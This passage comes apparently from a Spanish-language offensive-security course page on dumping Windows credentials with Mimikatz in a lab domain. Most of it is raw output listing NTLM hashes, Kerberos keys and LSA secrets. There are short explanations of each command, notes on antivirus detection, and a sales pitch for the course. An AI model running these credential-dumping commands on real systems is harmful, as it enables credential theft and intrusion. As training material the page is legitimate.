      aes256_hmac       (4096) : 7e16bff797907f940783a6315b3ab4bd398542aabf2bc888506bce52b0961cf4
      aes128_hmac       (4096) : e87a3a66df7112bf158fd184ffa88547
      des_cbc_md5       (4096) : 4a43754f1c08dca7

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : EC2AMAZ-N0S1NB6Administrator
    Credentials
      des_cbc_md5       : 264a2c3df40ba886
    OldCredentials
      des_cbc_md5       : 76315edf8a0191ea


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: d7da45674bae3a0476c0f64b67121f7d

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : be9923d30a0cdf3a73493d7d32eb96e4

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : c5a174bdaaf42f78aea168d2bb0736459de5ad0b5051997187d8b86f7af8ee69
      aes128_hmac       (4096) : 17456060abe8c50bc7ec5474e44d0ae4
      des_cbc_md5       (4096) : 5e435ecec4efbfdc

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : 5e435ecec4efbfdc


mimikatz(commandline) # lsadump::secrets
Domain : WEBSERVER
SysKey : ea7b3f466f263386e6dc165bcde0d1d2

Local name : WEBSERVER ( S-1-5-21-35825707-945739770-2891244367 )
Domain name : SPARTANCYBERSEC ( S-1-5-21-1861162130-2580302541-221646211 )
Domain FQDN : spartancybersec.corp

Policy subsystem is : 1.18
LSA Key(s) : 1, default {140c9bf8-da47-a27f-96d7-2b5527fd404e}
  [00] {140c9bf8-da47-a27f-96d7-2b5527fd404e} d51da8d90b5e95219f57070b04e71dfb6e95fc27241437fc8ef876b3c2ff43a6

Secret  : $MACHINE.ACC
cur/hex : 34 f7 2c a2 fa 00 56 a8 2a bc a7 ad d3 22 c9 cf dc 8c fe f8 87 ca 51 22 44 fb 80 b4 39 22 31 03 c1 bd 32 46 81 65 98 f4 fc c2 b8 22 fc 84 7f c3 81 fa 69 8d 77 d2 ed e9 57 b4 51 19 4b 1a 94 04 6c fc 1c 42 03 e6 1b 0a e6 90 61 40 10 9e a8 95 33 69 fa f5 65 f6 67 12 15 ae fe b7 64 ce d7 58 27 c7 62 7d 5d 79 40 73 c9 b9 32 2d 7d b1 82 5d ca b5 f2 ec 28 33 ea 00 5a 83 b1 ac b6 cc 63 9b 4a 3f ab 2e f2 41 c1 3c a4 a1 8e 84 51 af 8e a7 76 f0 68 13 e4 23 be 79 32 ff 7a 6a c7 34 ac c5 44 2a c8 91 a1 76 b5 04 c5 31 ad c5 ee 13 f4 96 fa 0f 25 86 5c 34 6e f7 c3 9e e9 1e c6 8b 5c 6a 71 72 dd 8f c2 d2 c5 91 1a c9 e1 3a ac 89 24 ea ef 08 66 30 50 b1 bd d6 39 8e 9b d7 0a 5d a0 e4 b1 21 7c 20 5b dd a1 69 ce 63 d1 70 15 e9 11 f1
    NTLM:449c5f226aff8a2af42ac07ebaf901cb
    SHA1:8af38efaf6e0c5c701c5d793438fbcdf4815777a
old/hex : de ce 87 d1 ac 7b 8a ff c5 3b db 11 1d bd 9f 81 ca 32 f1 c5 cc 3f 89 cc 95 80 7a 97 1c 5d 2d 8b 28 af 7d 25 1a 53 7e b9 5c b9 2a 23 6a fb ca bb 9e 20 16 d4 3c f6 7e b4 b4 76 48 c6 b7 10 25 9a 07 b5 07 b2 7f d2 b1 b0 a1 b0 f9 ce a1 92 a7 26 3d 0d ff ca d8 16 5b 60 9d 20 64 ea d9 0b f5 5a c0 0f 79 1f a0 b4 e3 43 cd 63 d1 ec 14 f8 5d bb 4c e0 22 da 1e 83 6f 1a eb 39 82 cd 45 97 23 ea a4 ef d0 52 72 96 cb a1 f5 1c 07 ea ef cb 45 17 7b 5a f0 0b 8b 57 bb 8f 1e 35 2f f3 55 57 61 5b 4f 12 2f 51 11 c2 1b 60 59 39 c6 df 0c 06 9b 11 db 70 92 9e 90 6b 6c 49 f8 f7 d4 af 4c 86 21 87 e4 ea 57 50 a6 b7 87 ad 4d 61 c5 b0 35 84 79 c6 9d 26 8f a7 0f e7 3a e3 fb 34 24 88 27 fd c5 ae d5 61 67 1e eb 78 a7 05 dc 38 9a 9c 72 0a 44 cc
    NTLM:7d0c4cdc32724b99ef4459147401471a
    SHA1:cd54e4ac32cca2e2ad07df657a832d9ee1cabe04

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 91 be 0d 0d 7a 07 12 fc 89 cd eb f3 39 1e 99 37 6b 34 ac d1 b5 b9 27 6f 74 f7 bb 7f 9b 8c 21 e6 39 98 83 e7 19 c4 ef f4
    full: 91be0d0d7a0712fc89cdebf3391e99376b34acd1b5b9276f74f7bb7f9b8c21e6399883e719c4eff4
    m/u : 91be0d0d7a0712fc89cdebf3391e99376b34acd1 / b5b9276f74f7bb7f9b8c21e6399883e719c4eff4
old/hex : 01 00 00 00 3f 58 17 78 dc 26 36 52 37 eb 61 20 87 07 4c 73 40 d8 73 7d 36 32 97 aa 29 58 8c 35 f7 07 26 34 80 42 33 16 9f 13 c7 b9
    full: 3f581778dc26365237eb612087074c7340d8737d363297aa29588c35f7072634804233169f13c7b9
    m/u : 3f581778dc26365237eb612087074c7340d8737d / 363297aa29588c35f7072634804233169f13c7b9

Secret  : NL$KM
cur/hex : b6 96 c7 7e 17 8a 0c dd 8c 39 c2 0a a2 91 24 44 a2 e4 4d c2 09 59 46 c0 7f 95 ea 11 cb 7f cb 72 ec 2e 5a 06 01 1b 26 fe 6d a7 88 0f a5 e7 1f a5 96 cd e5 3f a0 06 5e c1 a5 01 a1 ce 8c 24 76 95
old/hex : b6 96 c7 7e 17 8a 0c dd 8c 39 c2 0a a2 91 24 44 a2 e4 4d c2 09 59 46 c0 7f 95 ea 11 cb 7f cb 72 ec 2e 5a 06 01 1b 26 fe 6d a7 88 0f a5 e7 1f a5 96 cd e5 3f a0 06 5e c1 a5 01 a1 ce 8c 24 76 95

mimikatz(commandline) # exit
Bye!
```
{% endcode %}

Vamos a desglosar cada parte del comando para entender mejor los procesos y tecnologías involucrados:

1. **.\mimikatz.exe**: Este es el comando para ejecutar Mimikatz. `.\` indica que Mimikatz se ejecuta desde el directorio actual en la línea de comandos de Windows.
2. **'privilege::debug'**: Este comando en Mimikatz solicita privilegios de depuración para el proceso Mimikatz. Los privilegios de depuración son necesarios para acceder a ciertas áreas de la memoria del sistema operativo y realizar operaciones que normalmente están restringidas.
3. **'token::elevate'**: Este comando intenta elevar los privilegios de Mimikatz. En el contexto de Mimikatz, esto generalmente significa obtener un token de seguridad de un proceso con privilegios más altos, permitiendo que Mimikatz opere con esos privilegios elevados.
4. **'sekurlsa::logonpasswords'**: Este comando extrae las contraseñas y otros datos de autenticación de la memoria del sistema, específicamente desde la seguridad de Kerberos, SSP, msv1\_0, entre otros. Utiliza el módulo sekurlsa de Mimikatz para acceder a la información almacenada por el proceso [LSASS (Local Security Authority Subsystem Service)](https://books.spartan-cybersec.com/cpad/persistencia-en-windows-local/que-es-mimikatz/lsass).
5. **'lsadump::sam'**: Este comando extrae las credenciales almacenadas en la base de datos SAM (Security Accounts Manager). La SAM contiene las credenciales de todos los usuarios locales del sistema y se utiliza generalmente para obtener hashes de contraseñas de cuentas locales.
6.  **'lsadump::secrets'**: Este comando se utiliza para extraer "secretos" almacenados por el sistema, como claves de acceso y otros datos sensibles, que pueden estar almacenados en el registro o en el servicio LSASS.

    ## Extraccion de credenciales con Mimikatz con binario

    Para llevar tu aprendizaje al siguiente nivel y practicar estas técnicas de manera segura y efectiva, te invitamos a adquirir acceso premium a nuestro material de curso. No pierdas esta oportunidad de profundizar tus conocimientos. Para más información y adquirir tu acceso, visita nuestro canal de ventas: [https://wa.link/j265a0](https://wa.link/j265a0). ¡Te esperamos para empezar este viaje juntos!

    **OBJETIVO DEL EJERCICIO #6:**

    Utilizar mimikatz en formato de binario sobre Windows para exfiltrar secretos. Para realizarlo es suficiente tener encendido UNICAMENTE `WEBSERVER` y `First-DC`.

    ### Pros y Contras de ejecutar Mimikatz con mimikatz.exe <a href="#pros-y-contras-de-ejecutar-mimikatz-con-mimikatz.exe" id="pros-y-contras-de-ejecutar-mimikatz-con-mimikatz.exe"></a>

    #### **Pros** <a href="#pros" id="pros"></a>

    * **Funcionalidad Completa**: La versión ejecutable suele tener todas las funciones de Mimikatz disponibles y está actualizada con las últimas características.
    * **Rapidez**: Al ejecutar el binario directamente, se suele tener una ejecución más rápida y directa de las funciones deseadas.

    #### **Contras** <a href="#contras" id="contras"></a>

    * **Detección**: Es más probable que los antivirus y las herramientas de seguridad modernas detecten la versión ejecutable debido a sus firmas conocidas.
    * **Necesidad de Escritura en el Disco**: A menos que se cargue en la memoria de manera especial, es probable que requiera ser escrito en el disco para su ejecución, lo que aumenta el riesgo de detección y deja evidencia forense.
    * **Bloqueo por Políticas de Seguridad**: Políticas de grupo y configuraciones de seguridad de Windows pueden impedir la ejecución de binarios desconocidos o no firmados.

    ```
    PS C:\Users\adminwebserver\Desktop> .\mimikatz.exe 'privilege::debug' 'token::elevate' 'sekurlsa::logonpasswords' 'lsadump::sam' 'lsadump::secrets' exit

      .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
     .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
     ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
     ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
     '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
      '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

    mimikatz(commandline) # privilege::debug
    Privilege '20' OK

    mimikatz(commandline) # token::elevate
    Token Id  : 0
    User name :
    SID name  : NT AUTHORITY\SYSTEM

    708     {0;000003e7} 1 D 20361          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
     -> Impersonated !
     * Process Token : {0;000828d1} 2 F 2370414     SPARTANCYBERSEC\adminwebserver  S-1-5-21-1861162130-2580302541-221646211-1130   (14g,24p)       Primary
     * Thread Token  : {0;000003e7} 1 D 2408646     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

    mimikatz(commandline) # sekurlsa::logonpasswords

    Authentication Id : 0 ; 534822 (00000000:00082926)
    Session           : RemoteInteractive from 2
    User Name         : adminwebserver
    Domain            : SPARTANCYBERSEC
    Logon Server      : FIRST-DC
    Logon Time        : 11/6/2023 12:17:35 AM
    SID               : S-1-5-21-1861162130-2580302541-221646211-1130
            msv :
             [00000003] Primary
             * Username : adminwebserver
             * Domain   : SPARTANCYBERSEC
             * NTLM     : 64fbae31cc352fc26af97cbdef151e03
             * SHA1     : c220d333379050d852f3e65b010a817712b8c176
             * DPAPI    : ade33bd531fcf91dc0463eed20cd825d
            tspkg :
            wdigest :
             * Username : adminwebserver
             * Domain   : SPARTANCYBERSEC
             * Password : (null)
            kerberos :
             * Username : adminwebserver
             * Domain   : SPARTANCYBERSEC.CORP
             * Password : (null)
            ssp :
            credman :
            cloudap :

    Authentication Id : 0 ; 534737 (00000000:000828d1)
    Session           : RemoteInteractive from 2
    User Name         : adminwebserver
    Domain            : SPARTANCYBERSEC
    Logon Server      : FIRST-DC
    Logon Time        : 11/6/2023 12:17:35 AM
    SID               : S-1-5-21-1861162130-2580302541-221646211-1130
            msv :
             [00000003] Primary
             * Username : adminwebserver
             * Domain   : SPARTANCYBERSEC
             * NTLM     : 64fbae31cc352fc26af97cbdef151e03
             * SHA1     : c220d333379050d852f3e65b010a817712b8c176
             * DPAPI    : ade33bd531fcf91dc0463eed20cd825d
            tspkg :
            wdigest :
             * Username : adminwebserver
             * Domain   : SPARTANCYBERSEC
             * Password : (null)
            kerberos :
             * Username : adminwebserver
             * Domain   : SPARTANCYBERSEC.CORP
             * Password : (null)
            ssp :
            credman :
            cloudap :

    Authentication Id : 0 ; 509514 (00000000:0007c64a)
    Session           : Interactive from 2
    User Name         : DWM-2
    Domain            : Window Manager
    Logon Server      : (null)
    Logon Time        : 11/6/2023 12:17:33 AM
    SID               : S-1-5-90-0-2
            msv :
             [00000003] Primary
             * Username : WEBSERVER$
             * Domain   : SPARTANCYBERSEC
             * NTLM     : 449c5f226aff8a2af42ac07ebaf901cb
             * SHA1     : 8af38efaf6e0c5c701c5d793438fbcdf4815777a
            tspkg :
            wdigest :
             * Username : WEBSERVER$
             * Domain   : SPARTANCYBERSEC
             * Password : (null)
            kerberos :
             * Username : WEBSERVER$
             * Domain   : spartancybersec.corp
             * Password : 34 f7 2c a2 fa 00 56 a8 2a bc a7 ad d3 22 c9 cf dc 8c fe f8 87 ca 51 22 44 fb 80 b4 39 22 31 03 c1 bd 32 46 81 65 98 f4 fc c2 b8 22 fc 84 7f c3 81 fa 69 8d 77 d2 ed e9 57 b4 51 19 4b 1a 94 04 6c fc 1c 42 03 e6 1b 0a e6 90 61 40 10 9e a8 95 33 69 fa f5 65 f6 67 12 15 ae fe b7 64 ce d7 58 27 c7 62 7d 5d 79 40 73 c9 b9 32 2d 7d b1 82 5d ca b5 f2 ec 28 33 ea 00 5a 83 b1 ac b6 cc 63 9b 4a 3f ab 2e f2 41 c1 3c a4 a1 8e 84 51 af 8e a7 76 f0 68 13 e4 23 be 79 32 ff 7a 6a c7 34 ac c5 44 2a c8 91 a1 76 b5 04 c5 31 ad c5 ee 13 f4 96 fa 0f 25 86 5c 34 6e f7 c3 9e e9 1e c6 8b 5c 6a 71 72 dd 8f c2 d2 c5 91 1a c9 e1 3a ac 89 24 ea ef 08 66 30 50 b1 bd d6 39 8e 9b d7 0a 5d a0 e4 b1 21 7c 20 5b dd a1 69 ce 63 d1 70 15 e9 11 f1
            ssp :
            credman :
            cloudap :

    Authentication Id : 0 ; 509498 (00000000:0007c63a)
    Session           : Interactive from 2
    User Name         : DWM-2
    Domain            : Window Manager
    Logon Server      : (null)
    Logon Time        : 11/6/2023 12:17:33 AM
    SID               : S-1-5-90-0-2
            msv :
             [00000003] Primary
             * Username : WEBSERVER$
             * Domain   : SPARTANCYBERSEC
             * NTLM     : 449c5f226aff8a2af42ac07ebaf901cb
             * SHA1     : 8af38efaf6e0c5c701c5d793438fbcdf4815777a
            tspkg :
            wdigest :
             * Username : WEBSERVER$
             * Domain   : SPARTANCYBERSEC
             * Password : (null)
            kerberos :
             * Username : WEBSERVER$
             * Domain   : spartancybersec.corp
             * Password : 34 f7 2c a2 fa 00 56 a8 2a bc a7 ad d3 22 c9 cf dc 8c fe f8 87 ca 51 22 44 fb 80 b4 39 22 31 03 c1 bd 32 46 81 65 98 f4 fc c2 b8 22 fc 84 7f c3 81 fa 69 8d 77 d2 ed e9 57 b4 51 19 4b 1a 94 04 6c fc 1c 42 03 e6 1b 0a e6 90 61 40 10 9e a8 95 33 69 fa f5 65 f6 67 12 15 ae fe b7 64 ce d7 58 27 c7 62 7d 5d 79 40 73 c9 b9 32 2d 7d b1 82 5d ca b5 f2 ec 28 33 ea 00 5a 83 b1 ac b6 cc 63 9b 4a 3f ab 2e f2 41 c1 3c a4 a1 8e 84 51 af 8e a7 76 f0 68 13 e4 23 be 79 32 ff 7a 6a c7 34 ac c5 44 2a c8 91 a1 76 b5 04 c5 31 ad c5 ee 13 f4 96 fa 0f 25 86 5c 34 6e f7 c3 9e e9 1e c6 8b 5c 6a 71 72 dd 8f c2 d2 c5 91 1a c9 e1 3a ac 89 24 ea ef 08 66 30 50 b1 bd d6 39 8e 9b d7 0a 5d a0 e4 b1 21 7c 20 5b dd a1 69 ce 63 d1 70 15 e9 11 f1
            ssp :
            credman :
            cloudap :

    Authentication Id : 0 ; 508492 (00000000:0007c24c)
    Session           : Interactive from 2
    User Name         : UMFD-2
    Domain            : Font Driver Host
    Logon Server      : (null)
    Logon Time        : 11/6/2023 12:17:33 AM
    SID               : S-1-5-96-0-2
            msv :
             [00000003] Primary
             * Username : WEBSERVER$
             * Domain   : SPARTANCYBERSEC
             * NTLM     : 449c5f226aff8a2af42ac07ebaf901cb
             * SHA1     : 8af38efaf6e0c5c701c5d793438fbcdf4815777a
            tspkg :
            wdigest :
             * Username : WEBSERVER$
             * Domain   : SPARTANCYBERSEC
             * Password : (null)
            kerberos :
             * Username : WEBSERVER$
             * Domain   : spartancybersec.corp
             * Password : 34 f7 2c a2 fa 00 56 a8 2a bc a7 ad d3 22 c9 cf dc 8c fe f8 87 ca 51 22 44 fb 80 b4 39 22 31 03 c1 bd 32 46 81 65 98 f4 fc c2 b8 22 fc 84 7f c3 81 fa 69 8d 77 d2 ed e9 57 b4 51 19 4b 1a 94 04 6c fc 1c 42 03 e6 1b 0a e6 90 61 40 10 9e a8 95 33 69 fa f5 65 f6 67 12 15 ae fe b7 64 ce d7 58 27 c7 62 7d 5d 79 40 73 c9 b9 32 2d 7d b1 82 5d ca b5 f2 ec 28 33 ea 00 5a 83 b1 ac b6 cc 63 9b 4a 3f ab 2e f2 41 c1 3c a4 a1 8e 84 51 af 8e a7 76 f0 68 13 e4 23 be 79 32 ff 7a 6a c7 34 ac c5 44 2a c8 91 a1 76 b5 04 c5 31 ad c5 ee 13 f4 96 fa 0f 25 86 5c 34 6e f7 c3 9e e9 1e c6 8b 5c 6a 71 72 dd 8f c2 d2 c5 91 1a c9 e1 3a ac 89 24 ea ef 08 66 30 50 b1 bd d6 39 8e 9b d7 0a 5d a0 e4 b1 21 7c 20 5b dd a1 69 ce 63 d1 70 15 e9 11 f1
            ssp :
            credman :
            cloudap :

    Authentication Id : 0 ; 45151 (00000000:0000b05f)
    Session           : Interactive from 1
    User Name         : DWM-1
    Domain            : Window Manager
    Logon Server      : (null)
    Logon Time        : 11/6/2023 12:16:14 AM
    SID               : S-1-5-90-0-1
            msv :
             [00000003] Primary
             * Username : WEBSERVER$
             * Domain   : SPARTANCYBERSEC
             * NTLM     : 449c5f226aff8a2af42ac07ebaf901cb
             * SHA1     : 8af38efaf6e0c5c701c5d793438fbcdf4815777a
            tspkg :
            wdigest :
             * Username : WEBSERVER$
             * Domain   : SPARTANCYBERSEC
             * Password : (null)
            kerberos :
             * Username : WEBSERVER$
             * Domain   : spartancybersec.corp
             * Password : 34 f7 2c a2 fa 00 56 a8 2a bc a7 ad d3 22 c9 cf dc 8c fe f8 87 ca 51 22 44 fb 80 b4 39 22 31 03 c1 bd 32 46 81 65 98 f4 fc c2 b8 22 fc 84 7f c3 81 fa 69 8d 77 d2 ed e9 57 b4 51 19 4b 1a 94 04 6c fc 1c 42 03 e6 1b 0a e6 90 61 40 10 9e a8 95 33 69 fa f5 65 f6 67 12 15 ae fe b7 64 ce d7 58 27 c7 62 7d 5d 79 40 73 c9 b9 32 2d 7d b1 82 5d ca b5 f2 ec 28 33 ea 00 5a 83 b1 ac b6 cc 63 9b 4a 3f ab 2e f2 41 c1 3c a4 a1 8e 84 51 af 8e a7 76 f0 68 13 e4 23 be 79 32 ff 7a 6a c7 34 ac c5 44 2a c8 91 a1 76 b5 04 c5 31 ad c5 ee 13 f4 96 fa 0f 25 86 5c 34 6e f7 c3 9e e9 1e c6 8b 5c 6a 71 72 dd 8f c2 d2 c5 91 1a c9 e1 3a ac 89 24 ea ef 08 66 30 50 b1 bd d6 39 8e 9b d7 0a 5d a0 e4 b1 21 7c 20 5b dd a1 69 ce 63 d1 70 15 e9 11 f1
            ssp :
            credman :
            cloudap :

    Authentication Id : 0 ; 996 (00000000:000003e4)
    Session           : Service from 0
    User Name         : WEBSERVER$
    Domain            : SPARTANCYBERSEC
    Logon Server      : (null)
    Logon Time        : 11/6/2023 12:16:14 AM
    SID               : S-1-5-20
            msv :
             [00000003] Primary
             * Username : WEBSERVER$
             * Domain   : SPARTANCYBERSEC
             * NTLM     : 449c5f226aff8a2af42ac07ebaf901cb
             * SHA1     : 8af38efaf6e0c5c701c5d793438fbcdf4815777a
            tspkg :
            wdigest :
             * Username : WEBSERVER$
             * Domain   : SPARTANCYBERSEC
             * Password : (null)
            kerberos :
             * Username : webserver$
             * Domain   : SPARTANCYBERSEC.CORP
             * Password : (null)
            ssp :
            credman :
            cloudap :

    Authentication Id : 0 ; 26036 (00000000:000065b4)
    Session           : Interactive from 0
    User Name         : UMFD-0
    Domain            : Font Driver Host
    Logon Server      : (null)
    Logon Time        : 11/6/2023 12:16:14 AM
    SID               : S-1-5-96-0-0
            msv :
             [00000003] Primary
             * Username : WEBSERVER$
             * Domain   : SPARTANCYBERSEC
             * NTLM     : 449c5f226aff8a2af42ac07ebaf901cb
             * SHA1     : 8af38efaf6e0c5c701c5d793438fbcdf4815777a
            tspkg :
            wdigest :
             * Username : WEBSERVER$
             * Domain   : SPARTANCYBERSEC
             * Password : (null)
            kerberos :
             * Username : WEBSERVER$
             * Domain   : spartancybersec.corp
             * Password : 34 f7 2c a2 fa 00 56 a8 2a bc a7 ad d3 22 c9 cf dc 8c fe f8 87 ca 51 22 44 fb 80 b4 39 22 31 03 c1 bd 32 46 81 65 98 f4 fc c2 b8 22 fc 84 7f c3 81 fa 69 8d 77 d2 ed e9 57 b4 51 19 4b 1a 94 04 6c fc 1c 42 03 e6 1b 0a e6 90 61 40 10 9e a8 95 33 69 fa f5 65 f6 67 12 15 ae fe b7 64 ce d7 58 27 c7 62 7d 5d 79 40 73 c9 b9 32 2d 7d b1 82 5d ca b5 f2 ec 28 33 ea 00 5a 83 b1 ac b6 cc 63 9b 4a 3f ab 2e f2 41 c1 3c a4 a1 8e 84 51 af 8e a7 76 f0 68 13 e4 23 be 79 32 ff 7a 6a c7 34 ac c5 44 2a c8 91 a1 76 b5 04 c5 31 ad c5 ee 13 f4 96 fa 0f 25 86 5c 34 6e f7 c3 9e e9 1e c6 8b 5c 6a 71 72 dd 8f c2 d2 c5 91 1a c9 e1 3a ac 89 24 ea ef 08 66 30 50 b1 bd d6 39 8e 9b d7 0a 5d a0 e4 b1 21 7c 20 5b dd a1 69 ce 63 d1 70 15 e9 11 f1
            ssp :
            credman :
            cloudap :

    Authentication Id : 0 ; 26012 (00000000:0000659c)
    Session           : Interactive from 1
    User Name         : UMFD-1
    Domain            : Font Driver Host
    Logon Server      : (null)
    Logon Time        : 11/6/2023 12:16:14 AM
    SID               : S-1-5-96-0-1
            msv :
             [00000003] Primary
             * Username : WEBSERVER$
             * Domain   : SPARTANCYBERSEC
             * NTLM     : 449c5f226aff8a2af42ac07ebaf901cb
             * SHA1     : 8af38efaf6e0c5c701c5d793438fbcdf4815777a
            tspkg :
            wdigest :
             * Username : WEBSERVER$
             * Domain   : SPARTANCYBERSEC
             * Password : (null)
            kerberos :
             * Username : WEBSERVER$
             * Domain   : spartancybersec.corp
             * Password : 34 f7 2c a2 fa 00 56 a8 2a bc a7 ad d3 22 c9 cf dc 8c fe f8 87 ca 51 22 44 fb 80 b4 39 22 31 03 c1 bd 32 46 81 65 98 f4 fc c2 b8 22 fc 84 7f c3 81 fa 69 8d 77 d2 ed e9 57 b4 51 19 4b 1a 94 04 6c fc 1c 42 03 e6 1b 0a e6 90 61 40 10 9e a8 95 33 69 fa f5 65 f6 67 12 15 ae fe b7 64 ce d7 58 27 c7 62 7d 5d 79 40 73 c9 b9 32 2d 7d b1 82 5d ca b5 f2 ec 28 33 ea 00 5a 83 b1 ac b6 cc 63 9b 4a 3f ab 2e f2 41 c1 3c a4 a1 8e 84 51 af 8e a7 76 f0 68 13 e4 23 be 79 32 ff 7a 6a c7 34 ac c5 44 2a c8 91 a1 76 b5 04 c5 31 ad c5 ee 13 f4 96 fa 0f 25 86 5c 34 6e f7 c3 9e e9 1e c6 8b 5c 6a 71 72 dd 8f c2 d2 c5 91 1a c9 e1 3a ac 89 24 ea ef 08 66 30 50 b1 bd d6 39 8e 9b d7 0a 5d a0 e4 b1 21 7c 20 5b dd a1 69 ce 63 d1 70 15 e9 11 f1
            ssp :
            credman :
            cloudap :

    Authentication Id : 0 ; 995 (00000000:000003e3)
    Session           : Service from 0
    User Name         : IUSR
    Domain            : NT AUTHORITY
    Logon Server      : (null)
    Logon Time        : 11/6/2023 12:16:17 AM
    SID               : S-1-5-17
            msv :
            tspkg :
            wdigest :
             * Username : (null)
             * Domain   : (null)
             * Password : (null)
            kerberos :
            ssp :
            credman :
            cloudap :

    Authentication Id : 0 ; 997 (00000000:000003e5)
    Session           : Service from 0
    User Name         : LOCAL SERVICE
    Domain            : NT AUTHORITY
    Logon Server      : (null)
    Logon Time        : 11/6/2023 12:16:14 AM
    SID               : S-1-5-19
            msv :
            tspkg :
            wdigest :
             * Username : (null)
             * Domain   : (null)
             * Password : (null)
            kerberos :
             * Username : (null)
             * Domain   : (null)
             * Password : (null)
            ssp :
            credman :
            cloudap :

    Authentication Id : 0 ; 45216 (00000000:0000b0a0)
    Session           : Interactive from 1
    User Name         : DWM-1
    Domain            : Window Manager
    Logon Server      : (null)
    Logon Time        : 11/6/2023 12:16:14 AM
    SID               : S-1-5-90-0-1
            msv :
             [00000003] Primary
             * Username : WEBSERVER$
             * Domain   : SPARTANCYBERSEC
             * NTLM     : 7d0c4cdc32724b99ef4459147401471a
             * SHA1     : cd54e4ac32cca2e2ad07df657a832d9ee1cabe04
            tspkg :
            wdigest :
             * Username : WEBSERVER$
             * Domain   : SPARTANCYBERSEC
             * Password : (null)
            kerberos :
             * Username : WEBSERVER$
             * Domain   : spartancybersec.corp
             * Password : de ce 87 d1 ac 7b 8a ff c5 3b db 11 1d bd 9f 81 ca 32 f1 c5 cc 3f 89 cc 95 80 7a 97 1c 5d 2d 8b 28 af 7d 25 1a 53 7e b9 5c b9 2a 23 6a fb ca bb 9e 20 16 d4 3c f6 7e b4 b4 76 48 c6 b7 10 25 9a 07 b5 07 b2 7f d2 b1 b0 a1 b0 f9 ce a1 92 a7 26 3d 0d ff ca d8 16 5b 60 9d 20 64 ea d9 0b f5 5a c0 0f 79 1f a0 b4 e3 43 cd 63 d1 ec 14 f8 5d bb 4c e0 22 da 1e 83 6f 1a eb 39 82 cd 45 97 23 ea a4 ef d0 52 72 96 cb a1 f5 1c 07 ea ef cb 45 17 7b 5a f0 0b 8b 57 bb 8f 1e 35 2f f3 55 57 61 5b 4f 12 2f 51 11 c2 1b 60 59 39 c6 df 0c 06 9b 11 db 70 92 9e 90 6b 6c 49 f8 f7 d4 af 4c 86 21 87 e4 ea 57 50 a6 b7 87 ad 4d 61 c5 b0 35 84 79 c6 9d 26 8f a7 0f e7 3a e3 fb 34 24 88 27 fd c5 ae d5 61 67 1e eb 78 a7 05 dc 38 9a 9c 72 0a 44 cc
            ssp :
            credman :
            cloudap :

    Authentication Id : 0 ; 24887 (00000000:00006137)
    Session           : UndefinedLogonType from 0
    User Name         : (null)
    Domain            : (null)
    Logon Server      : (null)
    Logon Time        : 11/6/2023 12:16:13 AM
    SID               :
            msv :
             [00000003] Primary
             * Username : WEBSERVER$
             * Domain   : SPARTANCYBERSEC
             * NTLM     : 449c5f226aff8a2af42ac07ebaf901cb
             * SHA1     : 8af38efaf6e0c5c701c5d793438fbcdf4815777a
            tspkg :
            wdigest :
            kerberos :
            ssp :
            credman :
            cloudap :

    Authentication Id : 0 ; 999 (00000000:000003e7)
    Session           : UndefinedLogonType from 0
    User Name         : WEBSERVER$
    Domain            : SPARTANCYBERSEC
    Logon Server      : (null)
    Logon Time        : 11/6/2023 12:16:13 AM
    SID               : S-1-5-18
            msv :
            tspkg :
            wdigest :
             * Username : WEBSERVER$
             * Domain   : SPARTANCYBERSEC
             * Password : (null)
            kerberos :
             * Username : webserver$
             * Domain   : SPARTANCYBERSEC.CORP
             * Password : 34 f7 2c a2 fa 00 56 a8 2a bc a7 ad d3 22 c9 cf dc 8c fe f8 87 ca 51 22 44 fb 80 b4 39 22 31 03 c1 bd 32 46 81 65 98 f4 fc c2 b8 22 fc 84 7f c3 81 fa 69 8d 77 d2 ed e9 57 b4 51 19 4b 1a 94 04 6c fc 1c 42 03 e6 1b 0a e6 90 61 40 10 9e a8 95 33 69 fa f5 65 f6 67 12 15 ae fe b7 64 ce d7 58 27 c7 62 7d 5d 79 40 73 c9 b9 32 2d 7d b1 82 5d ca b5 f2 ec 28 33 ea 00 5a 83 b1 ac b6 cc 63 9b 4a 3f ab 2e f2 41 c1 3c a4 a1 8e 84 51 af 8e a7 76 f0 68 13 e4 23 be 79 32 ff 7a 6a c7 34 ac c5 44 2a c8 91 a1 76 b5 04 c5 31 ad c5 ee 13 f4 96 fa 0f 25 86 5c 34 6e f7 c3 9e e9 1e c6 8b 5c 6a 71 72 dd 8f c2 d2 c5 91 1a c9 e1 3a ac 89 24 ea ef 08 66 30 50 b1 bd d6 39 8e 9b d7 0a 5d a0 e4 b1 21 7c 20 5b dd a1 69 ce 63 d1 70 15 e9 11 f1
            ssp :
            credman :
            cloudap :

    mimikatz(commandline) # lsadump::sam
    Domain : WEBSERVER
    SysKey : ea7b3f466f263386e6dc165bcde0d1d2
    Local SID : S-1-5-21-35825707-945739770-2891244367

    SAMKey : 0f38480331d27a37fb84a64691c96638

    RID  : 000001f4 (500)
    User : Administrator
      Hash NTLM: f47f6266f4bb428db65cd949e7537f52

    Supplemental Credentials:
    * Primary:NTLM-Strong-NTOWF *
        Random Value : 95278d33a26e8418cde3b6bc618d5d4c

    * Primary:Kerberos-Newer-Keys *
        Default Salt : EC2AMAZ-N0S1NB6Administrator
        Default Iterations : 4096
        Credentials
          aes256_hmac       (4096) : 487149fe0751036e0aa497d82728570248f671894c39912e818bc058546478da
          aes128_hmac       (4096) : 95f019490c136ba744dd27b3248d862d
          des_cbc_md5       (4096) : 264a2c3df40ba886
        OldCredentials
